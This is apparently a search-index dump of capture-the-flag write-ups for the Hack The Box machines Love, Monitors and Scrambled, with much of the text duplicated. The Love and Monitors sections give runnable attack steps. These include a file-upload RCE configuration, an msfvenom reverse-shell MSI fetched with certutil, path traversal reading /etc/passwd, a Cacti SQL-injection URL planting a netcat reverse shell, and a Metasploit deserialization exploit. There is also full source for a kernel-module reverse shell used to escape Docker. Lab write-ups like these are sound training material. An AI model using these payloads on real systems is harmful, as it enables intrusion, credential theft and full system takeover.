Host '10.10.14.23' is not allowed to connect to this MariaDB server 5000 /tcp open http Apache httpd 2 .4.46 ( OpenSSL/1.1.1j PHP/7.3.27 ) | _http-server-header: Apache/2.4.46 ( Win64 ) OpenSSL/1.1.1j PHP/7.3.27 | _http-title: 403 Forbidden 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port3306-TCP:V = 7 .80%I = 7 %D = 5 /2%Time = 608E3CB1%P = x86_64-pc-linux-gnu%r ( NUL SF:L,4A, \"F\\0\\0\\x01\\xffj\\x04Host\\x20'10\\.10\\.14\\.23'\\x20is\\x20not\\x20allowe SF:d\\x20to\\x20connect\\x20to\\x20this\\x20MariaDB\\x20server\" ) ; Service Info: Hosts: www.example.com, LOVE, www.love.htb ; OS: Windows ; CPE: cpe:/o:microsoft:windows From nmap we found new sub-domain: staing.love.htb Web Enumeration \u00b6 staging.love.htb \u00b6 We found a web page that scans files be passing URLs at http://staging.love.htb/beta.php from it I was able to read local host service http://127.0.0.1:5000 , after reading the file source code I was able to obtain admin login credentials: admin:@LoveIsInTheAir!!!! Then used the credentials to login to the main web page love.htb \u00b6 Found that the website is running Voting System Exploitation \u00b6 File Upload RCE \u00b6 link: https://www.exploit-db.com/exploits/49445 Exploit: ... # --- Edit your settings here ---- IP = \"10.10.10.239\" # Website's URL USERNAME = \"admin\" #Auth username PASSWORD = \"@LoveIsInTheAir!!!!\" # Auth Password REV_IP = \"10.10.14.x\" # Reverse shell IP REV_PORT = \"9001\" # Reverse port # -------------------------------- ... Post Exploitation \u00b6 After gaining access into the box as phoebe user we can read user.txt flag. C:\\Users\\Phoebe\\Desktop>more user.txt more user.txt 6c1971cf2a4dfdb4684c14cf8246e129 Privilege Escalation \u00b6 Winpeas \u00b6 First of all, I uploaded winpeas into the target machine and run it. And found interesting output. .... [+] Checking AlwaysInstallElevated [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated AlwaysInstallElevated set to 1 in HKLM! AlwaysInstallElevated set to 1 in HKCU! ... Always Install Elevated \u00b6 When checking user privileges, we will found that the user have SeChangeNotifyPrivilege c : \\ Windows \\ Temp > whoami / priv whoami / priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ==================================== ======== SeShutdownPrivilege Shut down the system Disabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeUndockPrivilege Remove computer from docking station Disabled SeIncreaseWorkingSetPrivilege Increase a process working set Disabled SeTimeZonePrivilege Change the time zone Disabled c : \\ Windows \\ Temp > Furthermore, from Winpeas we Identified that the user also having Always Install Evevated privileges so we can abuse it to escluate our privileges. See the following link: https://ed4m4s.blog/privilege-escalation/windows/always-install-elevated Exploitation Process Generate a reverse shell payload using msfvenom msfvenom -p windows/x64/shell_reverse_tcp LHOST = 10 .10.14.x LPORT = 9002 -f msi -o reverse.msi Upload it to the target machine Local python3 -m http.server 8888 Target certutil - urlcache - f http : //10.10.14.x:8888/reverse.msi reverse.msi Open netcat listener in your local machine nc -nlvp 9002 Exec the uploaded payload using msiexec msiexec / quiet / qn / i reverse . msi After execution we will receive remote connection back as administrator. nc -nlvp 9002 listening on [ any ] 9002 ... connect to [ 10 .10.14.23 ] from ( UNKNOWN ) [ 10 .10.10.239 ] 54407 Microsoft Windows [ Version 10 .0.19042.928 ] ( c ) Microsoft Corporation. All rights reserved. C: \\W INDOWS \\s ystem32>whoami whoami nt authority \\s ystem The box is pwned! now we can read root.flag and submit it.","title":"Love Write-up"},{"location":"Writeups/machines/love/love/#walkthrough","text":"","title":"Walkthrough"},{"location":"Writeups/machines/love/love/#attack-scenario-diagram","text":"","title":"Attack Scenario Diagram"},{"location":"Writeups/machines/love/love/#recon","text":"","title":"Recon"},{"location":"Writeups/machines/love/love/#nmap","text":"~/tmp/htb/exploit nmap 10 .10.10.239 -sC -sV Starting Nmap 7 .80 ( https://nmap.org ) at 2021 -05-02 09 :46 +04 Nmap scan report for 10 .10.10.239 Host is up ( 0 .43s latency ) . Not shown: 993 closed ports PORT STATE SERVICE VERSION 80 /tcp open http Apache httpd 2 .4.46 (( Win64 ) OpenSSL/1.1.1j PHP/7.3.27 ) | http-cookie-flags: | /: | PHPSESSID: | _ httponly flag not set | _http-server-header: Apache/2.4.46 ( Win64 ) OpenSSL/1.1.1j PHP/7.3.27 | _http-title: Voting System using PHP 135 /tcp open msrpc Microsoft Windows RPC 139 /tcp open netbios-ssn Microsoft Windows netbios-ssn 443 /tcp open ssl/http Apache httpd 2 .4.46 ( OpenSSL/1.1.1j PHP/7.3.27 ) | _http-server-header: Apache/2.4.46 ( Win64 ) OpenSSL/1.1.1j PHP/7.3.27 | _http-title: 403 Forbidden | ssl-cert: Subject: commonName = staging.love.htb/organizationName = ValentineCorp/stateOrProvinceName = m/countryName = in | Not valid before: 2021 -01-18T14:00:16 | _Not valid after: 2022 -01-18T14:00:16 | _ssl-date: TLS randomness does not represent time | tls-alpn: | _ http/1.1 445 /tcp open microsoft-ds Windows 10 Pro 19042 microsoft-ds ( workgroup: WORKGROUP ) 3306 /tcp open mysql? | fingerprint-strings: | NULL: | _ Host '10.10.14.23' is not allowed to connect to this MariaDB server 5000 /tcp open http Apache httpd 2 .4.46 ( OpenSSL/1.1.1j PHP/7.3.27 ) | _http-server-header: Apache/2.4.46 ( Win64 ) OpenSSL/1.1.1j PHP/7.3.27 | _http-title: 403 Forbidden 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port3306-TCP:V = 7 .80%I = 7 %D = 5 /2%Time = 608E3CB1%P = x86_64-pc-linux-gnu%r ( NUL SF:L,4A, \"F\\0\\0\\x01\\xffj\\x04Host\\x20'10\\.10\\.14\\.23'\\x20is\\x20not\\x20allowe SF:d\\x20to\\x20connect\\x20to\\x20this\\x20MariaDB\\x20server\" ) ; Service Info: Hosts: www.example.com, LOVE, www.love.htb ; OS: Windows ; CPE: cpe:/o:microsoft:windows From nmap we found new sub-domain: staing.love.htb","title":"nmap"},{"location":"Writeups/machines/love/love/#web-enumeration","text":"","title":"Web Enumeration"},{"location":"Writeups/machines/love/love/#staginglovehtb","text":"We found a web page that scans files be passing URLs at http://staging.love.htb/beta.php from it I was able to read local host service http://127.0.0.1:5000 , after reading the file source code I was able to obtain admin login credentials: admin:@LoveIsInTheAir!!!! Then used the credentials to login to the main web page","title":"staging.love.htb"},{"location":"Writeups/machines/love/love/#lovehtb","text":"Found that the website is running Voting System","title":"love.htb"},{"location":"Writeups/machines/love/love/#exploitation","text":"","title":"Exploitation"},{"location":"Writeups/machines/love/love/#file-upload-rce","text":"link: https://www.exploit-db.com/exploits/49445 Exploit: ... # --- Edit your settings here ---- IP = \"10.10.10.239\" # Website's URL USERNAME = \"admin\" #Auth username PASSWORD = \"@LoveIsInTheAir!!!!\" # Auth Password REV_IP = \"10.10.14.x\" # Reverse shell IP REV_PORT = \"9001\" # Reverse port # -------------------------------- ...","title":"File Upload RCE"},{"location":"Writeups/machines/love/love/#post-exploitation","text":"After gaining access into the box as phoebe user we can read user.txt flag. C:\\Users\\Phoebe\\Desktop>more user.txt more user.txt 6c1971cf2a4dfdb4684c14cf8246e129","title":"Post Exploitation"},{"location":"Writeups/machines/love/love/#privilege-escalation","text":"","title":"Privilege Escalation"},{"location":"Writeups/machines/love/love/#winpeas","text":"First of all, I uploaded winpeas into the target machine and run it. And found interesting output. .... [+] Checking AlwaysInstallElevated [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated AlwaysInstallElevated set to 1 in HKLM! AlwaysInstallElevated set to 1 in HKCU! ...","title":"Winpeas"},{"location":"Writeups/machines/love/love/#always-install-elevated","text":"When checking user privileges, we will found that the user have SeChangeNotifyPrivilege c : \\ Windows \\ Temp > whoami / priv whoami / priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ==================================== ======== SeShutdownPrivilege Shut down the system Disabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeUndockPrivilege Remove computer from docking station Disabled SeIncreaseWorkingSetPrivilege Increase a process working set Disabled SeTimeZonePrivilege Change the time zone Disabled c : \\ Windows \\ Temp > Furthermore, from Winpeas we Identified that the user also having Always Install Evevated privileges so we can abuse it to escluate our privileges. See the following link: https://ed4m4s.blog/privilege-escalation/windows/always-install-elevated","title":"Always Install Elevated"},{"location":"Writeups/machines/monitors/monitors/","text":"Monitors Walkthrough \u00b6 Overview \u00b6 Machine Info \u00b6 IP Difficulty OS 10.10.10.238 Hard Linux Recon \u00b6 NMAP \u00b6 \u039e monitors/notes \u2192 nmap 10 .10.10.238 Starting Nmap 7 .91 ( https://nmap.org ) at 2021 -04-25 13 :10 EDT Nmap scan report for 10 .10.10.238 Host is up ( 0 .25s latency ) . Not shown: 998 closed ports PORT STATE SERVICE 22 /tcp open ssh 80 /tcp open http Enumeration \u00b6 WordPress Plugin WP with Spritz 1.0 - Remote File Inclusion \u00b6 Exploit http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url = /../../../..//etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin sshd:x:110:65534::/run/sshd:/usr/sbin/nologin marcus:x:1000:1000:Marcus Haynes:/home/marcus:/bin/bash Debian-snmp:x:112:115::/var/lib/snmp:/bin/false mysql:x:109:114:MySQL Server,,,:/nonexistent:/bin/false wp-config.php content: <?php ..... define ( 'DB_USER' , 'wpadmin' ); /** MySQL database password */ define ( 'DB_PASSWORD' , 'BestAdministrator@2020!' ); ..... Reading php logs http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/proc/self/fd/10 we will find a new subdomain: cacti-admin.monitors.htb Exploitation \u00b6 SQLi in Cacti CMS \u00b6 First of all login into Cacti CMS with credentials: admin:BestAdministrator@2020! After Researching, found that Cacti is vulnerable to SQLi. See the following link: https://github.com/Cacti/cacti/issues/3622 We can exploit it by typing the following into the URL: http://cacti-admin.monitors.htb/cacti/color.php?action=export&header=false&filter=1%27)+UNION+SELECT+1,username,password,4,5,6,7+from+user_auth;update+settings+set+value=%27rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2%3E%261|nc+10.10.14.x+9001+%3E/tmp/f;%27+where+name=%27path_php_binary%27;--+- Run netcat listener in local machine with port 9001: nc -nlvp 9001 Then enter: http://cacti-admin.monitors.htb/cacti/host.php?action=reindex&host_id=1 You will receive reverse shell as user www-data : nnc -nvlp 9001 listening on [ any ] 9001 ... connect to [ 10 .10.14.x ] from ( UNKNOWN ) [ 10 .10.10.238 ] 56312 www-data@monitors:/usr/share/cacti/cacti$ Pivot to Marcus \u00b6 ww-data@monitors:/etc$ cat /etc/systemd/system/cacti-backup.service cat /etc/systemd/system/cacti-backup.service ... ExecStart = /home/marcus/.backup/backup.sh ... www-data@monitors:/etc$ cat /home/marcus/.backup/backup.sh cat /home/marcus/.backup/backup.sh #!/bin/bash backup_name = \"cacti_backup\" config_pass = \"VerticalEdge2020\" ... marcus:VerticalEdge2020 SSH into the target as Marcus ssh -l marcus 10 .10.10.238 Privilege Escalation \u00b6 Enumerating \u00b6 While inside docker container, I saw one local service running at localhost port 8443. marcus@monitors:~$ netstat -tulpn Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 127 .0.0.1:8443 0 .0.0.0:* LISTEN - tcp 0 0 127 .0.0.1:3306 0 .0.0.0:* LISTEN - tcp 0 0 127 .0.0.53:53 0 .0.0.0:* LISTEN - tcp 0 0 0 .0.0.0:22 0 .0.0.0:* LISTEN - tcp6 0 0 :::80 :::* LISTEN - tcp6 0 0 :::22 :::* LISTEN - udp 0 0 0 .0.0.0:41695 0 .0.0.0:* - udp 0 0 127 .0.0.53:53 0 .0.0.0:* - udp 0 0 127 .0.0.1:161 0 .0.0.0:* - Port Forward \u00b6 In order to access the local service, use SSH port forward using the following command: ssh -L 8443 :127.0.0.1:8443 marcus@monitors.htb Now we can access local service in our local machine at 127.0.0.1:8443 Exploiting Tomcat 9.0.31 \u00b6 We identified that service is running Tomcat 9.0.31 , which is vulnerable to RCE in Apache OFBiz XMLRPC via Deserialization of Untrusted Data (CVE-2020-9496) . We can exploit it using Metasploit: use exploit/linux/http/apache_ofbiz_deserialiation set payload linux/x64/shell_reverse_tcp set rhosts 127 .0.0.1 set lport 8443 set forceexploit true set lhost tun0 set srvhost tun0 exploit Then we will get RCE inside docker container: Escaping Docker Container \u00b6 We can escape docker container by abusing SYS_MODULE capability. See the following link: https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd To exploit it, follow these steps Create file reverse-shell.c : #include <linux/kmod.h> #include <linux/module.h> MODULE_LICENSE ( \"GPL\" ); MODULE_AUTHOR ( \"AttackDefense\" ); MODULE_DESCRIPTION ( \"LKM reverse shell module\" ); MODULE_VERSION ( \"1.0\" ); char * argv [] = { \"/bin/bash\" , \"-c\" , \"bash -i >& /dev/tcp/10.10.10.238/1234 0>&1\" , NULL }; static char * envp [] = { \"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\" , NULL }; static int __init reverse_shell_init ( void ) { return call_usermodehelper ( argv [ 0 ], argv , envp , UMH_WAIT_EXEC ); } static void __exit reverse_shell_exit ( void ) { printk ( KERN_INFO \"Exiting \\n \" ); } module_init ( reverse_shell_init ); module_exit ( reverse_shell_exit ); Create file Makefile : obj-m += reverse-shell.o all : make -C /lib/modules/ $( shell uname -r ) /build M = $( PWD ) modules clean : make -C /lib/modules/ $( shell uname -r ) /build M = $( PWD ) clean Transfer them into the target machine: Local python3 -m http.server 8002 Target wget http://10.10.14.x:8002/reverse-shell.c wget http://10.10.14.x:8002/Makefile Make sure to create folder in /tmp folder, and save those files inside that folder, ex: /tmp/exploit/reverse-shell.c Compile the exploit using make command root@84e75d9a2984:/tmp/reversenotshell# make make make -C /lib/modules/4.15.0-142-generic/build M = /tmp/reversenotshell modules make [ 1 ] : Entering directory '/usr/src/linux-headers-4.15.0-142-generic' CC [ M ] /tmp/reversenotshell/reverse-shell.o Building modules, stage 2 . MODPOST 1 modules CC /tmp/reversenotshell/reverse-shell.mod.o LD [ M ] /tmp/reversenotshell/reverse-shell.ko make [ 1 ] : Leaving directory '/usr/src/linux-headers-4.15.0-142-generic' Inside the target machine open netcat listener nc -nlvp 1234 Finally run the following command: root@84e75d9a2984:/tmp/reversenotshell# insmod reverse-shell.ko insmod reverse-shell.ko You will receive shell as root use in the target machine marcus@monitors:/tmp$ nc -nlvp 4455 Listening on [ 0 .0.0.0 ] ( family 0 , port 4455 ) Connection from 10 .10.10.238 45176 received! bash: cannot set terminal process group ( -1 ) : Inappropriate ioctl for device bash: no job control in this shell root@monitors:/# id id uid = 0 ( root ) gid = 0 ( root ) groups = 0 ( root )","title":"Monitors"},{"location":"Writeups/machines/monitors/monitors/#monitors-walkthrough","text":"","title":"Monitors Walkthrough"},{"location":"Writeups/machines/monitors/monitors/#overview","text":"","title":"Overview"},{"location":"Writeups/machines/monitors/monitors/#machine-info","text":"IP Difficulty OS 10.10.10.238 Hard Linux","title":"Machine Info"},{"location":"Writeups/machines/monitors/monitors/#recon","text":"","title":"Recon"},{"location":"Writeups/machines/monitors/monitors/#nmap","text":"\u039e monitors/notes \u2192 nmap 10 .10.10.238 Starting Nmap 7 .91 ( https://nmap.org ) at 2021 -04-25 13 :10 EDT Nmap scan report for 10 .10.10.238 Host is up ( 0 .25s latency ) . Not shown: 998 closed ports PORT STATE SERVICE 22 /tcp open ssh 80 /tcp open http","title":"NMAP"},{"location":"Writeups/machines/monitors/monitors/#enumeration","text":"","title":"Enumeration"},{"location":"Writeups/machines/monitors/monitors/#wordpress-plugin-wp-with-spritz-10-remote-file-inclusion","text":"Exploit http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url = /../../../..//etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin sshd:x:110:65534::/run/sshd:/usr/sbin/nologin marcus:x:1000:1000:Marcus Haynes:/home/marcus:/bin/bash Debian-snmp:x:112:115::/var/lib/snmp:/bin/false mysql:x:109:114:MySQL Server,,,:/nonexistent:/bin/false wp-config.php content: <?php ..... define ( 'DB_USER' , 'wpadmin' ); /** MySQL database password */ define ( 'DB_PASSWORD' , 'BestAdministrator@2020!' ); ..... Reading php logs http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/proc/self/fd/10 we will find a new subdomain: cacti-admin.monitors.htb","title":"WordPress Plugin WP with Spritz 1.0 - Remote File Inclusion"},{"location":"Writeups/machines/monitors/monitors/#exploitation","text":"","title":"Exploitation"},{"location":"Writeups/machines/monitors/monitors/#sqli-in-cacti-cms","text":"First of all login into Cacti CMS with credentials: admin:BestAdministrator@2020! After Researching, found that Cacti is vulnerable to SQLi. See the following link: https://github.com/Cacti/cacti/issues/3622 We can exploit it by typing the following into the URL: http://cacti-admin.monitors.htb/cacti/color.php?action=export&header=false&filter=1%27)+UNION+SELECT+1,username,password,4,5,6,7+from+user_auth;update+settings+set+value=%27rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2%3E%261|nc+10.10.14.x+9001+%3E/tmp/f;%27+where+name=%27path_php_binary%27;--+- Run netcat listener in local machine with port 9001: nc -nlvp 9001 Then enter: http://cacti-admin.monitors.htb/cacti/host.php?action=reindex&host_id=1 You will receive reverse shell as user www-data : nnc -nvlp 9001 listening on [ any ] 9001 ... connect to [ 10 .10.14.x ] from ( UNKNOWN ) [ 10 .10.10.238 ] 56312 www-data@monitors:/usr/share/cacti/cacti$","title":"SQLi in Cacti CMS"},{"location":"Writeups/machines/monitors/monitors/#pivot-to-marcus","text":"ww-data@monitors:/etc$ cat /etc/systemd/system/cacti-backup.service cat /etc/systemd/system/cacti-backup.service ... ExecStart = /home/marcus/.backup/backup.sh ... www-data@monitors:/etc$ cat /home/marcus/.backup/backup.sh cat /home/marcus/.backup/backup.sh #!/bin/bash backup_name = \"cacti_backup\" config_pass = \"VerticalEdge2020\" ... marcus:VerticalEdge2020 SSH into the target as Marcus ssh -l marcus 10 .10.10.238","title":"Pivot to Marcus"},{"location":"Writeups/machines/monitors/monitors/#privilege-escalation","text":"","title":"Privilege Escalation"},{"location":"Writeups/machines/monitors/monitors/#enumerating","text":"While inside docker container, I saw one local service running at localhost port 8443. marcus@monitors:~$ netstat -tulpn Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 127 .0.0.1:8443 0 .0.0.0:* LISTEN - tcp 0 0 127 .0.0.1:3306 0 .0.0.0:* LISTEN - tcp 0 0 127 .0.0.53:53 0 .0.0.0:* LISTEN - tcp 0 0 0 .0.0.0:22 0 .0.0.0:* LISTEN - tcp6 0 0 :::80 :::* LISTEN - tcp6 0 0 :::22 :::* LISTEN - udp 0 0 0 .0.0.0:41695 0 .0.0.0:* - udp 0 0 127 .0.0.53:53 0 .0.0.0:* - udp 0 0 127 .0.0.1:161 0 .0.0.0:* -","title":"Enumerating"},{"location":"Writeups/machines/monitors/monitors/#port-forward","text":"In order to access the local service, use SSH port forward using the following command: ssh -L 8443 :127.0.0.1:8443 marcus@monitors.htb Now we can access local service in our local machine at 127.0.0.1:8443","title":"Port Forward"},{"location":"Writeups/machines/monitors/monitors/#exploiting-tomcat-9031","text":"We identified that service is running Tomcat 9.0.31 , which is vulnerable to RCE in Apache OFBiz XMLRPC via Deserialization of Untrusted Data (CVE-2020-9496) . We can exploit it using Metasploit: use exploit/linux/http/apache_ofbiz_deserialiation set payload linux/x64/shell_reverse_tcp set rhosts 127 .0.0.1 set lport 8443 set forceexploit true set lhost tun0 set srvhost tun0 exploit Then we will get RCE inside docker container:","title":"Exploiting Tomcat 9.0.31"},{"location":"Writeups/machines/monitors/monitors/#escaping-docker-container","text":"We can escape docker container by abusing SYS_MODULE capability. See the following link: https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd To exploit it, follow these steps Create file reverse-shell.c : #include <linux/kmod.h> #include <linux/module.h> MODULE_LICENSE ( \"GPL\" ); MODULE_AUTHOR ( \"AttackDefense\" ); MODULE_DESCRIPTION ( \"LKM reverse shell module\" ); MODULE_VERSION ( \"1.0\" ); char * argv [] = { \"/bin/bash\" , \"-c\" , \"bash -i >& /dev/tcp/10.10.10.238/1234 0>&1\" , NULL }; static char * envp [] = { \"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\" , NULL }; static int __init reverse_shell_init ( void ) { return call_usermodehelper ( argv [ 0 ], argv , envp , UMH_WAIT_EXEC ); } static void __exit reverse_shell_exit ( void ) { printk ( KERN_INFO \"Exiting \\n \" ); } module_init ( reverse_shell_init ); module_exit ( reverse_shell_exit ); Create file Makefile : obj-m += reverse-shell.o all : make -C /lib/modules/ $( shell uname -r ) /build M = $( PWD ) modules clean : make -C /lib/modules/ $( shell uname -r ) /build M = $( PWD ) clean Transfer them into the target machine: Local python3 -m http.server 8002 Target wget http://10.10.14.x:8002/reverse-shell.c wget http://10.10.14.x:8002/Makefile Make sure to create folder in /tmp folder, and save those files inside that folder, ex: /tmp/exploit/reverse-shell.c Compile the exploit using make command root@84e75d9a2984:/tmp/reversenotshell# make make make -C /lib/modules/4.15.0-142-generic/build M = /tmp/reversenotshell modules make [ 1 ] : Entering directory '/usr/src/linux-headers-4.15.0-142-generic' CC [ M ] /tmp/reversenotshell/reverse-shell.o Building modules, stage 2 . MODPOST 1 modules CC /tmp/reversenotshell/reverse-shell.mod.o LD [ M ] /tmp/reversenotshell/reverse-shell.ko make [ 1 ] : Leaving directory '/usr/src/linux-headers-4.15.0-142-generic' Inside the target machine open netcat listener nc -nlvp 1234 Finally run the following command: root@84e75d9a2984:/tmp/reversenotshell# insmod reverse-shell.ko insmod reverse-shell.ko You will receive shell as root use in the target machine marcus@monitors:/tmp$ nc -nlvp 4455 Listening on [ 0 .0.0.0 ] ( family 0 , port 4455 ) Connection from 10 .10.10.238 45176 received! bash: cannot set terminal process group ( -1 ) : Inappropriate ioctl for device bash: no job control in this shell root@monitors:/# id id uid = 0 ( root ) gid = 0 ( root ) groups = 0 ( root )","title":"Escaping Docker Container"},{"location":"Writeups/machines/scrambled/writeup/","text":"Overview \u00b6 Scrambled machine was a Domain Controller which attracted me to walk through it. The attack scenario was interesting where it starts from hunting for domain users, pivoting into service accounts, .NET source code review and exploiting application using deserialization vulnerability. The box contains multiple pivoting points to reach the Domain Admin. However, I did not like that the NTLM authentication is disabled in the box, I had multiple issues while using Impacket's tools that took me time to solve those issues. In this blog, I'll demonstrate the attack scenario to Pwn this box with the help of PoshC2 framework. PoshC2 is very powerful tool for red teamers and can be customizable. However, because of the box doesn't have AV solution, I'll use the default profile/configuration of PoshC2. Machine Info \u00b6 Operating System Difficulty IP Windows Medium 10.10.11.168 Walkthrough \u00b6 Attack Scenario Diagram \u00b6 Recon \u00b6 nmap \u00b6 PORT STATE SERVICE REASON VERSION 53 /tcp open domain syn-ack Simple DNS Plus 80 /tcp open http syn-ack Microsoft IIS httpd 10 .0 | http-methods: | Supported Methods: OPTIONS TRACE GET HEAD POST | _ Potentially risky methods: TRACE | _http-server-header: Microsoft-IIS/10.0 | _http-title: Scramble Corp Intranet 88 /tcp open kerberos-sec syn-ack Microsoft Windows Kerberos ( server time: 2022 -07-15 08 :40:57Z ) 135 /tcp open msrpc syn-ack Microsoft Windows RPC 139 /tcp open netbios-ssn syn-ack Microsoft Windows netbios-ssn 389 /tcp open ldap syn-ack Microsoft Windows Active Directory LDAP ( Domain: scrm.local0., Site: Default-First-Site-Name ) | ssl-cert: Subject: commonName = DC1.scrm.local | Subject Alternative Name: othername:<unsupported>, DNS:DC1.scrm.local | Issuer: commonName = scrm-DC1-CA/domainComponent = scrm 445 /tcp open microsoft-ds? syn-ack 464 /tcp open kpasswd5? syn-ack 593 /tcp open ncacn_http syn-ack Microsoft Windows RPC over HTTP 1 .0 636 /tcp open ssl/ldap syn-ack Microsoft Windows Active Directory LDAP ( Domain: scrm.local0., Site: Default-First-Site-Name ) | ssl-cert: Subject: commonName = DC1.scrm.local | Subject Alternative Name: othername:<unsupported>, DNS:DC1.scrm.local | Issuer: commonName = scrm-DC1-CA/domainComponent = scrm 1433 /tcp open ms-sql-s syn-ack Microsoft SQL Server 2019 15 .00.2000.00 ; RTM 3268 /tcp open ldap syn-ack Microsoft Windows Active Directory LDAP ( Domain: scrm.local0., Site: Default-First-Site-Name ) | ssl-cert: Subject: commonName = DC1.scrm.local | Subject Alternative Name: othername:<unsupported>, DNS:DC1.scrm.local | Issuer: commonName = scrm-DC1-CA/domainComponent = scrm 3269 /tcp open ssl/ldap syn-ack Microsoft Windows Active Directory LDAP ( Domain: scrm.local0., Site: Default-First-Site-Name ) | ssl-cert: Subject: commonName = DC1.scrm.local | Subject Alternative Name: othername:<unsupported>, DNS:DC1.scrm.local | Issuer: commonName = scrm-DC1-CA/domainComponent = scrm Service Info: Host: DC1 ; OS: Windows ; CPE: cpe:/o:microsoft:windows Host script results: | _clock-skew: mean: 0s, deviation: 0s, median: 0s | ms-sql-info: | 10 .10.11.168:1433: | Version: | name: Microsoft SQL Server 2019 RTM | number: 15 .00.2000.00 | Product: Microsoft SQL Server 2019 | Service pack level: RTM | Post-SP patches applied: false | _ TCP port: 1433 | p2p-conficker: | Checking for Conficker.C or higher... | Check 1 ( port 42300 /tcp ) : CLEAN ( Timeout ) | Check 2 ( port 40536 /tcp ) : CLEAN ( Timeout ) | Check 3 ( port 9648 /udp ) : CLEAN ( Timeout ) | Check 4 ( port 31813 /udp ) : CLEAN ( Timeout ) | _ 0 /4 checks are positive: Host is CLEAN or ports are blocked | smb2-security-mode: | 2 .02: | _ Message signing enabled and required | smb2-time: | date: 2022 -07-15T08:41:43 | _ start_date: N/A By looking into nmap scan results, the ports 53, 389 and 636 are opened this indicates that the host is Domain Controller. Furthermore, the Domain Name is scrm.local and the hostname is DC1.scrm.local we have to add it to our hosts file. Another useful information from nmap results we identified that the port 1433 is open which represent MSSQL service. Web Enumeration \u00b6 Going through the web page /support.html we will notice an alert which stats the following message: Below the alert message, there is several web pages we can look into. By navigating into /salesorders.html web page, we will notice a guidance of using Sales Orders App . From the guidance we can see a new port which is 4411. Running nmap will give us the following results. 